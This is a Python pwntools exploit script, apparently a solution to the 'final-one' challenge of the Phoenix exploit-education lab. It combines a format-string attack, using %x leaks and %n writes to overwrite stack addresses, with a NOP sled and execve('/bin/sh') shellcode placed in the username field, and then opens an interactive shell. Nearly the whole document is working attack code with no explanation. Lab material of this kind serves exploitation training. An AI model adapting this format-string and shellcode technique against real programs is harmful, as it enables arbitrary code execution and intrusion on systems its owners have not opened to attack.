from pwn import *

e = ELF('/opt/phoenix/i486/final-one')
p = e.process(['--test'])

# shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Address of username global variable
# global_username = 0x8049ee0

# username = 'username 111' + p32(0xffffd66c) + p32(0xffffd66d) + p32(0xffffd66e) + p32(0xffffd66f) + '\xcc' * 100  + '111'
# password = 'login %X %X %X %X %X %X %X %X %X %X' + ' %n,%n,%n,%n'

username = 'username 111' + 'AAAA' + p32(0xffffd68c) + 'BBBB' + p32(0xffffd68d) + 'CCCC' + p32(0xffffd68e) + 'DDDD' + p32(0xffffd68f) + '\x90' * 32 + shellcode + '111'

password = 'login %X %X %X %X %X %X %X %X %X %X' + ' %240x%n,%257x%n,%48x%n,%255x%n'

print p.recvline()

print p.recv()
print 'Sending: ' + username
p.sendline(username)

print p.recv()
print 'Sending: ' + password
p.sendline(password)

print p.recv()
p.interactive()
